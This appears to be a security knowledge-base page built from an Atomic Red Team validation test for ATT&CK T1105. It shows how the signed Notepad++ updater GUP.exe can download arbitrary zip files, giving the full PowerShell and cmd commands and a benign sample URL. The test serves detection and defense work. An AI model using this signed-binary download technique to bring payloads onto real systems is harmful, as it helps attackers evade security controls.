---
atomic_guid: "66ee226e-64cb-4dae-80e3-5bf5763e4a51"
title: "Arbitrary file download using the Notepad++ GUP.exe binary"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "66ee226e-64cb-4dae-80e3-5bf5763e4a51"
  - "Arbitrary file download using the Notepad++ GUP.exe binary"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Arbitrary file download using the Notepad++ GUP.exe binary

GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.
[Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)
Upon execution, a sample zip file will be downloaded to C:\Temp\Sample folder

## Metadata

- Atomic GUID: 66ee226e-64cb-4dae-80e3-5bf5763e4a51
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### gup_executable

- description: GUP is an open source signed binary used by Notepad++ for software updates
- type: String
- default: PathToAtomicsFolder\T1105\bin\GUP.exe

### target_file_sha256

- description: SHA256 value of target ZIP file
- type: string
- default: CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6

### target_file_url

- description: URL of the target ZIP file (Eg: https://example.com/test.zip)
- type: url
- default: https://getsamplefiles.com/download/zip/sample-2.zip

### working_dir

- description: The directory where GUP.exe & it's dependecies exists
- type: path
- default: PathToAtomicsFolder\T1105\bin\

## Dependencies

Gup.exe binary must exist on disk at specified location (#{gup_executable})

### Prerequisite Check

```powershell
if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/bin/GUP.exe" -OutFile "#{gup_executable}"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
mkdir "c:\Temp"
cd #{working_dir}
GUP.exe -unzipTo "" "C:\Temp" "Sample #{target_file_url} #{target_file_sha256}"
```

### Cleanup

```cmd
rmdir /s /q "C:\Temp\Sample" >nul 2>nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
